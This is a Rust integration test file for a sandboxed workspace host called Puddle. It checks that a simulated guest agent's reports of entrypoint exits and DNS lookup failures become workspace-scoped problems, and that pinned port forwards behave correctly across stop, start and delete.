// ---- reports from the guest agent ---------------------------------------------------------

/// Speaks to the host as `name`'s guest agent would: one session on the workspace's route, one
/// control stream with `lines` on it. The session stays open until the returned guard drops.
async fn agent_says(
    rig: &Rig,
    name: &str,
    lines: &[puddle_agent_proto::AgentMessage],
) -> tokio::task::JoinHandle<()> {
    use futures_util::StreamExt as _;
    use puddle_agent_proto::tokio_yamux::Session;
    use tokio::io::AsyncWriteExt as _;
    let sandbox = WorkspaceName::new(name).unwrap().sandbox_name();
    let routes = rig.runtime.routes(&sandbox);
    let route = routes.first().unwrap();
    let conn = puddle_ipc::connect(&route.host).await.unwrap();
    let mut session = Session::new_client(conn, puddle_agent_proto::yamux::client_config());
    let mut control = session.control();
    let driver = tokio::spawn(async move { while let Some(Ok(_)) = session.next().await {} });
    let mut stream = control.open_stream().await.unwrap();
    stream
        .write_all(puddle_agent_proto::control::PREAMBLE)
        .await
        .unwrap();
    for line in lines {
        stream.write_all(&line.to_line().unwrap()).await.unwrap();
    }
    stream.flush().await.unwrap();
    driver
}

async fn wait_for_problem(host: &Host<FakeRuntime>, key: &str) -> puddle_types::Problem {
    eventually(&format!("the problem {key}"), APPLY, || {
        host.problems().list().into_iter().find(|p| p.key == key)
    })
    .await
}

#[tokio::test(flavor = "multi_thread")]
async fn an_entrypoint_that_dies_later_and_failing_lookups_are_problems_the_guest_cannot_widen() {
    use puddle_agent_proto::{AgentMessage, StubDnsTrouble};
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    create(&api, &mut events, "other").await;

    let session = agent_says(
        &rig,
        "acme",
        &[
            AgentMessage::entrypoint_exited(1, "dockerd: failed to start".to_owned()),
            AgentMessage::entrypoint_exited(2, "a second, different story".to_owned()),
            AgentMessage::stub_dns(StubDnsTrouble::UdpDropped, 40),
            AgentMessage::stub_dns(StubDnsTrouble::LookupTimedOut, 3),
        ],
    )
    .await;
    let problem = wait_for_problem(&host, "stub-dns:acme").await;
    assert_eq!(problem.title, "Name lookups in acme are failing");
    let entry = wait_for_problem(&host, "entrypoint:acme").await;
    assert_eq!(entry.title, "The image's entrypoint in acme stopped");
    assert!(
        entry.detail.contains("status 1: dockerd: failed to start"),
        "{}",
        entry.detail
    );
    assert!(
        host.problems()
            .list()
            .iter()
            .all(|p| p.workspace.as_ref().map(WorkspaceName::as_str) == Some("acme")),
        "{:?}",
        host.problems().list()
    );

    // A stop ends the DNS problem with the machine; the entrypoint problem stays until a start.
    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    let keys: Vec<_> = host.problems().list().into_iter().map(|p| p.key).collect();
    assert_eq!(keys, ["entrypoint:acme"]);
    session.abort();
    api.post("/api/workspaces/acme/start", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    assert!(
        host.problems().list().is_empty(),
        "{:?}",
        host.problems().list()
    );
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_stop_that_fails_leaves_the_workspace_running_and_its_reports_still_count() {
    use puddle_agent_proto::{AgentMessage, StubDnsTrouble};
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    rig.runtime
        .inject(Op::Stop, Fault::once(disk_error("stop")).only_for("acme"));
    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;

    let session = agent_says(
        &rig,
        "acme",
        &[AgentMessage::stub_dns(StubDnsTrouble::LookupFailed, 2)],
    )
    .await;
    let problem = wait_for_problem(&host, "stub-dns:acme").await;
    assert_eq!(problem.title, "Name lookups in acme are failing");
    session.abort();
    host.shutdown().await;
}

// ---- ports ---------------------------------------------------------------------------------

#[tokio::test(flavor = "multi_thread")]
async fn a_pinned_forward_follows_the_workspace_through_stop_start_and_delete() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    // A port of this computer nobody has right now.
    let port = {
        let l = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        l.local_addr().unwrap().port()
    };
    let addr = std::net::SocketAddr::from(([127, 0, 0, 1], port));
    let ports = |reply: support::Reply| reply.json();

    let none = ports(api.get("/api/workspaces/acme/ports").await);
    assert_eq!(none["running"], true);
    assert_eq!(none["ports"], json!([]));

    let body = json!({"host_port": port, "pinned": true}).to_string();
    let put = api.put("/api/workspaces/acme/ports/3000", &body).await;
    assert_eq!(put.status, 200, "{}", put.body);
    assert_eq!(
        put.json(),
        json!({"guest_port": 3000, "listening": false, "forwarded": true, "pinned": true, "host_port": port, "problem": null})
    );
    // It listens on loopback and is one of Puddle's own listeners: no guest may reach it.
    assert!(tokio::net::TcpStream::connect(addr).await.is_ok());
    assert_eq!(
        host.endpoints().find(addr, &puddle_netpolicy::OwnAddresses),
        Some(EndpointKind::PinnedForward)
    );
    // A second workspace-less request for the same port of this computer says who has it.
    let clash = api
        .put(
            "/api/workspaces/acme/ports/4000",
            &json!({"host_port": port}).to_string(),
        )
        .await;
    assert_eq!(clash.status, 409, "{}", clash.body);
    assert!(clash.body.contains("already in use by"), "{}", clash.body);

    // Stopping closes the forward and keeps the pin.
    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    assert!(tokio::net::TcpStream::connect(addr).await.is_err());
    assert_eq!(
        host.endpoints().find(addr, &puddle_netpolicy::OwnAddresses),
        None
    );
    let stopped = ports(api.get("/api/workspaces/acme/ports").await);
    assert_eq!(stopped["running"], false);
    assert_eq!(
        stopped["ports"],
        json!([{"guest_port": 3000, "listening": false, "forwarded": false, "pinned": true, "host_port": port, "problem": null}])
    );
    let refused = api.put("/api/workspaces/acme/ports/3000", &body).await;
    assert_eq!(refused.status, 409, "{}", refused.body);

    // The next start puts it back on the same port.
    api.post("/api/workspaces/acme/start", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    let back = ports(api.get("/api/workspaces/acme/ports").await);
    assert_eq!(back["running"], true);
    assert_eq!(back["ports"][0]["forwarded"], true);
    assert_eq!(back["ports"][0]["host_port"], port);
    assert!(tokio::net::TcpStream::connect(addr).await.is_ok());

    // Stopping the forward by hand closes it and takes the pin with it; pinning again restores both.
    let released = api.delete("/api/workspaces/acme/ports/3000", None).await;
    assert_eq!(released.status, 204, "{}", released.body);
    assert!(tokio::net::TcpStream::connect(addr).await.is_err());
    assert_eq!(
        host.store()
            .pinned_ports(&WorkspaceName::new("acme").unwrap())
            .unwrap(),
        []
    );
    let again = api.put("/api/workspaces/acme/ports/3000", &body).await;
    assert_eq!(again.status, 200, "{}", again.body);

    // Deleting the workspace removes its pins with it.
    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    let name = WorkspaceName::new("acme").unwrap();
    assert_eq!(host.store().pinned_ports(&name).unwrap().len(), 1);
    let delete = api
        .delete(
            "/api/workspaces/acme",
            Some(&json!({"confirm": true}).to_string()),
        )
        .await;
    assert_eq!(delete.status, 202, "{}", delete.body);
    events.until(ended("acme"), Duration::from_secs(20)).await;
    assert_eq!(host.store().pinned_ports(&name).unwrap(), []);
    host.shutdown().await;
}
